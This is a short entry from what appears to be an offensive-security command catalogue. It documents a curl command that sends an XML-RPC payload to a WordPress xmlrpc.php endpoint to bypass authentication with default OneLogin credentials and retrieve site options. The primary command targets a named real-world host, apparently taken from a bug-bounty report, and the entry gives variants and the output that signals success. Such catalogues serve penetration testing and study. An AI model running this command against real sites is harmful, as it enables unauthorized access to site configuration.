---
data: >-
  curl 'https://newsroom.uber.com/xmlrpc.php' --data-binary "`cat options.xml`"
  -H 'Content-type: application/xml'
tags:
  - auth-bypass
  - xmlrpc
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:31:52.530Z'
id: 0e7e2e3e-7da8-46c1-831f-1a9825c539d7
verified: false
validated: true
submitted: true
---
# curl-xmlrpc-auth-bypass

## Command

```bash
curl 'https://newsroom.uber.com/xmlrpc.php' --data-binary "`cat options.xml`" -H 'Content-type: application/xml'
```

## Description

Sends an XMLRPC payload to test authentication with default OneLogin credentials and retrieve WordPress options, confirming bypass.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--data-binary` | Reads XML from file for POST body | Yes |
| `-H 'Content-type: application/xml'` | Sets header for XML content | Yes |
| URL | Target xmlrpc.php endpoint | Yes |

## Examples

### Basic Usage

```bash
curl 'https://example.com/xmlrpc.php' --data-binary "`cat options.xml`" -H 'Content-type: application/xml'
```

### Advanced Usage

```bash
curl -v 'https://example.com/xmlrpc.php' --data-binary @options.xml -H 'Content-type: application/xml' --user-agent 'Mozilla/5.0'
```

## Expected Output

XML response with faultCode 0 and options struct, e.g., <string>WordPress</string> for software_name, confirming success.

## Related

- [[Related Procedure: Test-XMLRPC-Auth-with-Default-Credentials]]
